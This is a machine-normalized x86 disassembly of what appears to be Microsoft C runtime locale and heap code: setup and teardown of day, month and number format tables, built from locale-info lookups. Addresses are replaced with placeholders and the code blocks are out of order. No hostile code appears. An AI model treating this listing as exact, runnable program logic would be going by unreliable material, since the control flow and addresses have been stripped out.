push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10034a88
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10034ae2
push 0x10
push r--data
call sub_1002fdfc
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
sub_10034b50
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1003a3d8
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1003a3d8
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_10034bae
push 0x10
push r--data
call sub_1002fdfc
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10030231
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_1002fe41
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10034c48
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_10034c51
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10031d82
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_1003506c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10027a85
push [ esi + 0x8 ]
call sub_10027a85
push [ esi + 0xc ]
call sub_10027a85
push [ esi + 0x10 ]
call sub_10027a85
push [ esi + 0x14 ]
call sub_10027a85
push [ esi + 0x18 ]
call sub_10027a85
push [ esi ]
call sub_10027a85
push [ esi + 0x20 ]
call sub_10027a85
push [ esi + 0x24 ]
call sub_10027a85
push [ esi + 0x28 ]
call sub_10027a85
push [ esi + 0x2c ]
call sub_10027a85
push [ esi + 0x30 ]
call sub_10027a85
push [ esi + 0x34 ]
call sub_10027a85
push [ esi + 0x1c ]
call sub_10027a85
push [ esi + 0x38 ]
call sub_10027a85
push [ esi + 0x3c ]
call sub_10027a85
add esp 0x40
push [ esi + 0x40 ]
call sub_10027a85
push [ esi + 0x44 ]
call sub_10027a85
push [ esi + 0x48 ]
call sub_10027a85
push [ esi + 0x4c ]
call sub_10027a85
push [ esi + 0x50 ]
call sub_10027a85
push [ esi + 0x54 ]
call sub_10027a85
push [ esi + 0x58 ]
call sub_10027a85
push [ esi + 0x5c ]
call sub_10027a85
push [ esi + 0x60 ]
call sub_10027a85
push [ esi + 0x64 ]
call sub_10027a85
push [ esi + 0x68 ]
call sub_10027a85
push [ esi + 0x6c ]
call sub_10027a85
push [ esi + 0x70 ]
call sub_10027a85
push [ esi + 0x74 ]
call sub_10027a85
push [ esi + 0x78 ]
call sub_10027a85
push [ esi + 0x7c ]
call sub_10027a85
add esp 0x40
push [ esi + 0x80 ]
call sub_10027a85
push [ esi + 0x84 ]
call sub_10027a85
push [ esi + 0x88 ]
call sub_10027a85
push [ esi + 0x8c ]
call sub_10027a85
push [ esi + 0x90 ]
call sub_10027a85
push [ esi + 0x94 ]
call sub_10027a85
push [ esi + 0x98 ]
call sub_10027a85
push [ esi + 0x9c ]
call sub_10027a85
push [ esi + 0xa0 ]
call sub_10027a85
push [ esi + 0xa4 ]
call sub_10027a85
push [ esi + 0xa8 ]
call sub_10027a85
add esp 0x2c
sub_10035201
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_1002ddf5
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_10034c51
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_1003506c
push esi
call sub_10027a85
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_1003527a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
push esi
call sub_10027a85
pop ecx
sub_100352bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_1002ddf5
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_1002ddb0
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_10027a85
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_1002ddb0
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10031d82
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10031d82
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10031d82
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_1003527a
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_10027a85
push [ ebx + 0xbc ]
call sub_10027a85
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_10027a85
push [ ebp - 0x8 ]
call sub_10027a85
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10035489
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10027a85
pop ecx
push esi
call sub_10027a85
pop ecx
sub_10035517
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_1002ddf5
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_1002ddb0
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_10027a85
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_1002ddb0
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10031d82
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_10027a85
push [ ebp - 0x8 ]
call sub_10027a85
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_10035489
push ebx
call sub_10027a85
push [ ebp - 0x8 ]
call sub_10027a85
push [ ebp - 0x4 ]
call sub_10027a85
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_10027a85
push [ esi + 0xb0 ]
call sub_10027a85
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_100357dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_1002a8c8
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
shl esi 0x2
push [ esi + edi + 0x1c ]
call sub_10027160
push [ esi + edi ]
mov [ ebp - 0x8 ] eax
call sub_10027160
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1002ddb0
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_10027160
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push esi
call sub_10027160
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_100358e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_1002a8c8
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] 0xc
push [ esi + 0x30 ]
call sub_10027160
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_10027160
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x4 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1002ddb0
mov esi eax
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
add edi 0x68
mov [ ebp - 0x8 ] 0xc
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_10027160
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push esi
call sub_10027160
add esi eax
add edi 0x4
dec [ ebp - 0x8 ]
pop ecx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_100359ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_1002a8c8
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
shl ebx 0x2
push [ ebx + esi + 0x1c ]
call sub_10027160
push [ ebx + esi ]
mov [ ebp - 0x14 ] eax
call sub_10027160
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_10027160
push [ ebx ]
mov [ ebp - 0x14 ] eax
call sub_10027160
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
add eax edi
dec [ ebp - 0xc ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_10027160
push [ esi + 0x98 ]
mov ebx eax
call sub_10027160
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_10027160
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_10027160
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_10027160
lea eax [ edi + eax + 0xb9 ]
push eax
